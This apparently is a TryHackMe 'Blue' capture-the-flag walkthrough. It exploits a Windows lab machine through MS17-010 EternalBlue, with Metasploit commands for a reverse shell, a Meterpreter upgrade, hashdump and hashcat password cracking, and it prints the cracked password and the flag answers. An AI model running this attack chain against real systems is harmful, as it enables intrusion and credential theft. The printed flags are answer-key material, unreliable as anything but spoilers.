# [Blue](https://tryhackme.com/room/blue)

> Deploy & hack into a Windows machine, leveraging common misconfigurations issues.

## Scanning

scan the machine

```
nmap -A -T4 10.10.92.237
```

![image](https://user-images.githubusercontent.com/90561566/200109367-28962f61-8943-4d14-8a73-9e5d964af0d3.png)

We can see it's a windows machine name Jon-PC and 3 port under 1000 is opening

![image](https://user-images.githubusercontent.com/90561566/200109397-8209737a-a141-42ab-b58d-0fd91247e152.png)

Nmap also find a lot of vulnerabilities (seem about smb vuln)

```
nmap --script=vuln -T4 10.10.92.237
```

![image](https://user-images.githubusercontent.com/90561566/200109617-23ce7abd-c8a3-4729-bd8b-31bfde219ef9.png)

the answer is CVE-2017-0143 (ms17-010)

## Exploitation

Start Metasploit and use module exploit/windows/smb/ms17_010_eternalblue 

```
msfconsole
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
```

![image](https://user-images.githubusercontent.com/90561566/200110267-d066ba86-1cd8-4301-b7f4-e7e3c3dd3408.png)

now we need to set RHOSTS

```
set RHOSTS 10.10.92.237
set payload windows/x64/shell/reverse_tcp
exploit
```

if failed, try reboot the target machine or set LHOST with your openvpn ip

background session

![image](https://user-images.githubusercontent.com/90561566/200110728-b322a970-d94b-489c-a342-f782c011b32f.png)

## Privilege Escalation

now, we need convert shell to meterpreter

```
use post/multi/manage/shell_to_meterpreter
set session 1
exploit
```

it will create a new session 2

```
sessions -i 2
```

now we have escalated to NT AUTHORITY\SYSTEM

![image](https://user-images.githubusercontent.com/90561566/200111595-a6ede282-41cf-4a14-bcc2-08e4f6806903.png)

![image](https://user-images.githubusercontent.com/90561566/200111623-264280be-54ae-4768-96db-d10c804d6d94.png)

background this session too

First, let's list all of the processes running on the system. 

Just because we have system level privileges doesn't mean our process does! We'll have to migrate to a new process that does have those permissions

![image](https://user-images.githubusercontent.com/90561566/200111864-c9d79ce8-da34-49ec-8721-09779a558625.png)

Once a process is found, type migrate PROCESSID, where PROCESSID is the id of the process we are migrating to 

This migration process may fail, migrating processes is only successful realistically about 25% of the time.

## Cracking

dump all of the passwords

```
hashdump
```

![image](https://user-images.githubusercontent.com/90561566/200111953-f057a115-6e76-402c-89f5-b6f4afc5f380.png)

copy password hash to file

```
type ffb43f0de35be4d9917ac0cc8ad57f8d > pass.txt
```

windows pass is using NTLM hashtype (nt) with id=1000

```
hashcat -a 0 -m 1000 pass.txt /usr/share/wordlists/rockyou.txt --show
```

![image](https://user-images.githubusercontent.com/90561566/200112436-d0629063-8109-44df-a9fd-0e5354e4b018.png)

password is `alqfna22`

## Find flags

at meterpreter, we can use `search` as very strong command

```
search -f *flag*
```

![image](https://user-images.githubusercontent.com/90561566/200159342-b96d8ff8-db83-41d1-a558-01c5ee965280.png)

```
cat C:/flag1.txt
```

| Flag | flag1.txt |
| --- | --- |
| Answer | flag{access_the_machine} |

```
cat C:/Windows/System32/config/flag2.txt
```

| Flag | flag2.txt |
| --- | --- |
| Answer | flag{sam_database_elevated_access} |

```
cat C:/Users/Jon/Documents/flag3.txt
```

| Flag | flag3.txt |
| --- | --- |
| Answer | flag{admin_documents_can_be_valuable} |
